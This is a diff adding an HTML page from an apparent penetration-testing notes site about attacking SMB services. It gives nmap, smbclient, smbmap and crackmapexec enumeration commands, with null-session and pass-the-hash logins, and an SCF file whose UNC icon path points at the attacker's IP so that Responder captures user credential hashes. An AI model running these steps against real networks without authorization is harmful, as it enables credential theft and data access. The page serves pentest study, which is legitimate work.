@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>PORT 139/tcp, 445/tcp - SMB | Hacking Notes</title>
+<meta name="generator" content="Jekyll v3.8.4" />
+<meta property="og:title" content="PORT 139/tcp, 445/tcp - SMB" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="SMB stands for Server Message Block. It’s a protocol for sharing resources like files, printers, in general any resource which should be retreivable or made available by the server." />
+<meta property="og:description" content="SMB stands for Server Message Block. It’s a protocol for sharing resources like files, printers, in general any resource which should be retreivable or made available by the server." />
+<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/services/smb/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/services/smb/" />
+<meta property="og:site_name" content="Hacking Notes" />
+<script type="application/ld+json">
+{"description":"SMB stands for Server Message Block. It’s a protocol for sharing resources like files, printers, in general any resource which should be retreivable or made available by the server.","url":"http://0.0.0.0:4000/hackingnotes/services/smb/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"PORT 139/tcp, 445/tcp - SMB","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/hackingnotes/css/main.css">
+		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
+				Hacking Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/hackingnotes/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/">What is this?</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/active-directory/ad-attacks/">Active Directory</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/other/hacking-aws/">Other</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/hackingnotes/services/ftp/">Services</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
+								
+									<li class="nav-item current"><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/software/wordpress/">Software</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/web/file-inclusion/">Web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/changelog/">Change Log</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>Services</h2>
+				<h3>PORT 139/tcp, 445/tcp - SMB</h3>
+			</div>
+			<article class="content">
+				<p>SMB stands for Server Message Block. It’s a protocol for sharing resources like files, printers, in general any resource which should be retreivable or made available by the server.</p>
+
+<h1 id="introduction">Introduction</h1>
+
+<p>It primarily runs on port 445 or port 139 depending on the server . It is actually natively available in windows, so windows users don’t need to configure anything extra as such besides basic setting up. In Linux however ,it is a little different. To make it work for Linux, you need to install a samba server because Linux natively does not use SMB protocol.</p>
+
+<h1 id="scanning-the-network">Scanning the network</h1>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>We can do a port scanner selecting the NetBIOS and SMB ports:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -v -p 139,445 -oG smb.nmap &lt;ip-addr&gt;/&lt;mask&gt;
+grep "Up" smb.nmap | cut -d " " -f 2
+</code></pre></div></div>
+
+<h2 id="nbtscan">Nbtscan</h2>
+
+<p>We can scan for NetBIOS Service around the network in order to collect additional NetBIOS information like server names:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nbtscan -r &lt;ip-addr&gt;/&lt;mask&gt;
+</code></pre></div></div>
+
+<h1 id="enumeration-a-target">Enumeration a target</h1>
+
+<h2 id="nmap-scripts">Nmap scripts</h2>
+
+<p><code class="highlighter-rouge">Nmap</code> contains many useful NSE scripts that can be used to discover and enumerate SMB services. All these scripts are in the folder <code class="highlighter-rouge">/usr/share/nmap/scripts/</code></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -l /usr/share/nmap/scripts/smb*
+</code></pre></div></div>
+
+<p>You can launch the script with the <code class="highlighter-rouge">--script</code> parameter:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -v -p 139,445 --script=&lt;script&gt; &lt;ip-addr&gt;
+</code></pre></div></div>
+
+<h2 id="enum4linux">Enum4linux</h2>
+
+<p>Enum4linux is an script that automatize some tasks:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux -a [-u &lt;user&gt; -p &lt;pass&gt;"] &lt;ip-addr&gt;
+</code></pre></div></div>
+
+<h2 id="shared-folders">Shared Folders</h2>
+
+<p>There are some available <code class="highlighter-rouge">nmap</code> scripts that could help us in that work:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p 139,445 -sV --script smb-\* &lt;ip-addr&gt;
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">smbmap</code> will shows us available shares and permissions:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap -H &lt;ip-addr&gt;
+#Example Output
+[+] Guest session       IP: ip-addr:445   Name: ip-addr
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        anonymous                                               READ ONLY
+        IPC$                                                    NO ACCESS       IPC Service (kenobi server (Samba, Ubuntu))
+</code></pre></div></div>
+
+<p>And we can connect to these shares with <code class="highlighter-rouge">smbclient</code>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //&lt;ip-addr&gt;/&lt;share&gt;                # Guest Session
+smbclient //&lt;ip-addr&gt;/&lt;share&gt; -U "" -N       # Null Session
+smbclient //&lt;ip-addr&gt;/&lt;share&gt; -U &lt;user&gt;      # Authenticated Session
+
+# Older versions
+smbclient //&lt;ip-addr&gt;/&lt;share&gt; --option='client min protocol=NT1'
+</code></pre></div></div>
+
+<p>To download recursively all the share you can use <code class="highlighter-rouge">smbget</code>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbget -R smb://&lt;ip-addr&gt;/&lt;share&gt;
+smbget -R smb://&lt;ip-addr&gt;/&lt;share&gt; -U &lt;user&gt;
+</code></pre></div></div>
+
+<p>Also you could enumerate shares with <code class="highlighter-rouge">crackmapexec</code>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb &lt;ip-addr&gt; -u '' -p '' --shares #Null user
+crackmapexec smb &lt;ip-addr&gt; -u 'username' -p 'password' --shares #Guest user
+crackmapexec smb &lt;ip-addr&gt; -u 'username' -H '&lt;HASH&gt;' --shares #Guest user
+</code></pre></div></div>
+
+<p>Finally you can mount the share on your kali.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo mount -t cifs -o vers=2.0,username=guest,password=guest //&lt;ip-addr&gt;/&lt;share&gt;
+</code></pre></div></div>
+
+<h1 id="shell-command-files-scf-attack">Shell Command Files (SCF) attack</h1>
+
+<p>It is not new that SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Shell]
+Command=2
+IconFile=\\&lt;OUR.IP&gt;\share\pentestlab.ico
+[Taskbar]
+Command=ToggleDesktop
+</code></pre></div></div>
+
+<p>Adding the <strong>@</strong> symbol in front of the filename will place the file on the top of the share drive.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Filename: @attack.scf
+</code></pre></div></div>
+
+<p>When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and the password of the user, so we can capture it with Responder.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>responder -I eth0
+</code></pre></div></div>
+
+<ul>
+  <li><a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</a></li>
+</ul>
+
+<h1 id="references">References:</h1>
+
+<ul>
+  <li><a href="https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b">https://medium.com/@arnavtripathy98/smb-enumeration-for-penetration-testing-e782a328bf1b</a></li>
+  <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-smb#port-139">https://book.hacktricks.xyz/pentesting/pentesting-smb#port-139</a></li>
+  <li><a href="http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html">http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html</a></li>
+</ul>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
